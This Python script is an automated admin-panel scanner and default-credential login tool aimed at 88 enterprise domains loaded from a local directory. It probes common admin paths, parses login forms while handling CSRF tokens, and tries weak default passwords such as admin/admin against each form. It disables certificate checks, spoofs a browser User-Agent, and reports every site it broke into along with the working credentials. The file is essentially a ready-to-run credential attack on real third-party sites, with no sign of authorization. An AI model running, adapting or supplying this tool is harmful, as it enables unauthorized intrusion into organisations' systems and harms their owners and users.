#!/usr/bin/env python3
"""
Enterprise Admin Panel Scanner v2 - Fixed login attempt logic
Scans 88 enterprise sites for exposed admin panels and default credentials.
"""
import requests
import urllib3
import sys
import json
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 4
MAX_WORKERS = 10
SCAN_DIR = "/tmp/scan_results"
OUTPUT_FILE = "/tmp/admin_scan_results_v2.json"

ADMIN_PATHS = ["/admin", "/admin/login", "/login", "/admin.php", "/wp-admin"]

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "admin888"),
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
}

def load_domains():
    domains = []
    for fname in sorted(os.listdir(SCAN_DIR)):
        if fname.endswith('.json'):
            domain = fname.replace('.json', '')
            if domain.startswith('www.'):
                domain = domain[4:]
            domains.append(domain)
    return domains

def parse_login_form(html, base_url):
    """Parse login form from HTML - robust regex handling both attr orders"""
    result = {
        "action": "",
        "method": "post",
        "username_field": "",
        "password_field": "",
        "hidden_fields": {},
        "has_captcha": False,
    }
    
    # Find form action and method
    form_m = re.search(r'<form[^>]*action\s*=\s*["\']([^"\']+)["\']', html, re.I)
    if form_m:
        result["action"] = urljoin(base_url, form_m.group(1))
    else:
        result["action"] = base_url
    
    method_m = re.search(r'<form[^>]*method\s*=\s*["\']([^"\']+)["\']', html, re.I)
    if method_m:
        result["method"] = method_m.group(1).lower()
    
    # Find password field - check both attr orders
    pw_match = re.search(r'<input[^>]*type\s*=\s*["\']password["\']', html, re.I)
    if pw_match:
        # Extract name from this input
        name_m = re.search(r'name\s*=\s*["\']([^"\']+)["\']', pw_match.group(), re.I)
        if name_m:
            result["password_field"] = name_m.group(1)
    
    if not result["password_field"]:
        # Try reverse order: name then type
        for m in re.finditer(r'<input[^>]*name\s*=\s*["\']([^"\']+)["\'][^>]*type\s*=\s*["\']password["\']', html, re.I):
            result["password_field"] = m.group(1)
            break
    
    if not result["password_field"]:
        return None  # No password field = not a real login form
    
    # Find username field - try common names first
    uname_names = ['username', 'user', 'login', 'email', 'admin', 'account', 'name', 'uname', 'UserName', 'LoginId', 'loginId']
    for name in uname_names:
        if re.search(rf'name\s*=\s*["\']{re.escape(name)}["\']', html, re.I):
            result["username_field"] = name
            break
    
    if not result["username_field"]:
        # Fallback: any text input before the password field
        text_inputs = re.findall(r'<input[^>]*type\s*=\s*["\'](?:text|email)["\'][^>]*name\s*=\s*["\']([^"\']+)["\']', html, re.I)
        text_inputs2 = re.findall(r'<input[^>]*name\s*=\s*["\']([^"\']+)["\'][^>]*type\s*=\s*["\'](?:text|email)["\']', html, re.I)
        all_text = text_inputs + text_inputs2
        for name in all_text:
            if name != result["password_field"] and name.lower() not in ('captcha', 'checkcode', 'verify', '验证码'):
                result["username_field"] = name
                break
    
    # Extract hidden fields
    for m in re.finditer(r'<input[^>]*type\s*=\s*["\']hidden["\']', html, re.I):
        inp = m.group()
        name_m = re.search(r'name\s*=\s*["\']([^"\']+)["\']', inp, re.I)
        value_m = re.search(r'value\s*=\s*["\']([^"\']*)["\']', inp, re.I)
        if name_m:
            result["hidden_fields"][name_m.group(1)] = value_m.group(1) if value_m else ""
    
    # Check for captcha
    if re.search(r'(captcha|checkcode|verify|验证码|verification)', html, re.I):
        result["has_captcha"] = True
    
    return result

SUCCESS_INDICATORS = [
    "登录成功", "login success", "welcome", "dashboard",
    "控制面板", "后台管理", "管理首页", "admin panel", "管理中心",
    "网站管理", "系统管理", "会员管理", "内容管理",
]

FAILURE_INDICATORS = [
    "密码错误", "用户名错误", "账号不存在", "登录失败",
    "password error", "incorrect password", "invalid username",
    "wrong password", "login failed", "invalid credentials",
    "用户名或密码", "账号或密码", "用户名/密码", "密码不正确",
    "用户名不存在", "验证码错误", "captcha error",
]

def try_default_creds(domain, login_url, form_info, session):
    """Try all default credential combinations"""
    results = []
    
    for username, password in DEFAULT_CREDS:
        try:
            # Get fresh page for CSRF tokens
            resp = session.get(login_url, timeout=TIMEOUT, verify=False, headers=HEADERS)
            html = resp.text
            
            # Re-parse form (tokens may have changed)
            current_form = parse_login_form(html, login_url)
            if not current_form:
                break
            
            # Build POST data
            data = {}
            data[current_form["password_field"]] = password
            
            uname_field = current_form["username_field"] or form_info.get("username_field", "username")
            data[uname_field] = username
            
            # Add hidden fields (CSRF tokens etc)
            data.update(current_form.get("hidden_fields", {}))
            
            # Add remember/login/submit if present
            if "remember" in current_form.get("hidden_fields", {}):
                data["remember"] = "1"
            
            # Send login request
            post_url = current_form["action"]
            resp2 = session.post(
                post_url,
                data=data,
                timeout=TIMEOUT,
                allow_redirects=True,
                verify=False,
                headers=HEADERS,
            )
            
            text = resp2.text[:5000].lower() if resp2.text else ""
            final_url = resp2.url
            
            # Check for success
            is_success = False
            is_failure = False
            
            for ind in FAILURE_INDICATORS:
                if ind.lower() in text:
                    is_failure = True
                    break
            
            if not is_failure:
                for ind in SUCCESS_INDICATORS:
                    if ind.lower() in text:
                        is_success = True
                        break
                
                # Redirect-based success detection
                if not is_success and resp2.status_code == 302:
                    loc = resp2.headers.get("Location", "").lower()
                    if "login" not in loc and "error" not in loc:
                        is_success = True
                
                # Check if redirected away from login page
                if not is_success and not is_failure:
                    login_host = urlparse(login_url).netloc
                    final_host = urlparse(final_url).netloc
                    if login_host == final_host:
                        if not any(x in final_url.lower() for x in ['login', 'error', 'fail']):
                            # Check page content for admin indicators
                            if any(x in text for x in ['dashboard', 'admin', '管理', '后台', 'panel', '控制', '列表', '菜单']):
                                is_success = True
            
            attempt = {
                "username": username,
                "password": password,
                "status_code": resp2.status_code,
                "final_url": final_url,
                "success": is_success,
                "failure_detected": is_failure,
                "response_size": len(resp2.content),
            }
            results.append(attempt)
            
            if is_success:
                return results, current_form  # Stop on success
            
            time.sleep(0.5)
            
        except Exception as e:
            results.append({
                "username": username,
                "password": password,
                "error": str(e)[:100],
                "success": False,
            })
    
    return results, form_info

def scan_single_domain(domain):
    """Scan one domain"""
    result = {
        "domain": domain,
        "admin_panels": [],
        "accessible_panels": [],
        "login_attempts": [],
    }
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{domain}"
        
        for path in ADMIN_PATHS:
            url = f"{base_url}{path}"
            
            try:
                # First check without redirects
                r = session.head(url, timeout=TIMEOUT, allow_redirects=False, verify=False)
                status = r.status_code
                location = r.headers.get("Location", "")
                
                panel = {
                    "url": url,
                    "protocol": protocol,
                    "path": path,
                    "status_code": status,
                    "redirect_to": location if status in (301, 302, 307, 308) else "",
                    "has_login_form": False,
                    "login_form_parsed": False,
                    "server": r.headers.get("Server", ""),
                    "title": "",
                }
                
                # Follow redirect to get actual content
                actual_url = url
                if status in (301, 302, 307, 308) and location:
                    redirect_url = urljoin(url, location)
                    r2 = session.get(redirect_url, timeout=TIMEOUT, allow_redirects=True, verify=False, headers=HEADERS)
                    actual_url = r2.url
                    panel["final_url"] = actual_url
                    panel["final_status"] = r2.status_code
                    html = r2.text
                elif status == 200:
                    r2 = session.get(url, timeout=TIMEOUT, allow_redirects=True, verify=False, headers=HEADERS)
                    actual_url = r2.url
                    panel["final_url"] = actual_url
                    html = r2.text
                else:
                    continue  # Skip non-200/30x
                
                # Check for login form
                if 'type="password"' in html.lower() or "type='password'" in html.lower():
                    panel["has_login_form"] = True
                    
                    # Try to parse form
                    form_info = parse_login_form(html, actual_url)
                    if form_info:
                        panel["login_form_parsed"] = True
                        panel["username_field"] = form_info["username_field"]
                        panel["has_captcha"] = form_info["has_captcha"]
                        
                        # Extract title
                        title_m = re.search(r'<title[^>]*>([^<]+)</title>', html, re.I)
                        if title_m:
                            panel["title"] = title_m.group(1).strip()
                        
                        result["admin_panels"].append(panel)
                        
                        # Try default credentials
                        login_url = actual_url
                        if not form_info.get("action", "").endswith(("login", "check", "index", "init")):
                            login_url = actual_url
                        
                        attempts, final_form = try_default_creds(domain, login_url, form_info, session)
                        result["login_attempts"].extend(attempts)
                        
                        # Check for successful login
                        for a in attempts:
                            if a.get("success") and not a.get("failure_detected"):
                                result["accessible_panels"].append({
                                    "url": actual_url,
                                    "credentials": f"{a['username']}:{a['password']}",
                                    "type": "form_login",
                                    "final_url": a.get("final_url", ""),
                                })
                                break
                    else:
                        result["admin_panels"].append(panel)
                elif status in (200, 301, 302, 307, 308):
                    # Panel exists but might not be a login form - still record
                    result["admin_panels"].append(panel)
                
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                continue
            except Exception as e:
                continue
    
    return result

def main():
    domains = load_domains()
    print(f"[*] Scanning {len(domains)} enterprise sites")
    print(f"[*] Paths: {ADMIN_PATHS}")
    print(f"[*] Default creds: {[f'{u}:{p}' for u,p in DEFAULT_CREDS]}")
    print("=" * 70)
    
    results = []
    completed = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(scan_single_domain, d): d for d in domains}
        
        for future in as_completed(futures):
            domain = futures[future]
            completed += 1
            try:
                result = future.result()
                results.append(result)
                
                panels = len(result["admin_panels"])
                accessible = len(result["accessible_panels"])
                
                if accessible:
                    print(f"[{completed}/{len(domains)}] {domain} *** {accessible} ACCESSIBLE! ***")
                    for ap in result["accessible_panels"]:
                        print(f"  >>> {ap['url']} | {ap['credentials']}")
                else:
                    pw_forms = sum(1 for p in result["admin_panels"] if p.get("has_login_form"))
                    if pw_forms:
                        print(f"[{completed}/{len(domains)}] {domain} ({panels} panels, {pw_forms} login forms)")
                    elif panels:
                        print(f"[{completed}/{len(domains)}] {domain} ({panels} panels)")
                    else:
                        print(f"[{completed}/{len(domains)}] {domain} (no panels)")
                        
            except Exception as e:
                print(f"[{completed}/{len(domains)}] {domain} ERROR: {e}")
                results.append({"domain": domain, "error": str(e)})
    
    # Save results
    with open(OUTPUT_FILE, 'w') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    # Summary
    total_panels = sum(len(r.get("admin_panels", [])) for r in results)
    total_accessible = sum(len(r.get("accessible_panels", [])) for r in results)
    total_attempts = sum(len(r.get("login_attempts", [])) for r in results)
    login_form_count = sum(1 for r in results for p in r.get("admin_panels", []) if p.get("has_login_form"))
    
    print(f"\n{'='*70}")
    print(f"SCAN COMPLETE")
    print(f"{'='*70}")
    print(f"Domains: {len(results)}")
    print(f"Admin panels: {total_panels}")
    print(f"Login forms: {login_form_count}")
    print(f"Login attempts: {total_attempts}")
    print(f"ACCESSIBLE PANELS: {total_accessible}")
    
    if total_accessible:
        print(f"\n>>> ACCESSIBLE ADMIN PANELS <<<")
        for r in results:
            for ap in r.get("accessible_panels", []):
                print(f"  {r['domain']} | {ap['url']} | {ap['credentials']}")
    else:
        print(f"\nNo admin panels accessible with default credentials.")
    
    # Detail report
    print(f"\n--- LOGIN FORMS FOUND ---")
    for r in results:
        for p in r.get("admin_panels", []):
            if p.get("has_login_form"):
                captcha = " [CAPTCHA]" if p.get("has_captcha") else ""
                title = f" | {p['title']}" if p.get('title') else ""
                print(f"  {r['domain']} | {p['url']} | HTTP {p.get('status_code')} | field={p.get('username_field','?')}{captcha}{title}")
    
    print(f"\nResults saved to: {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
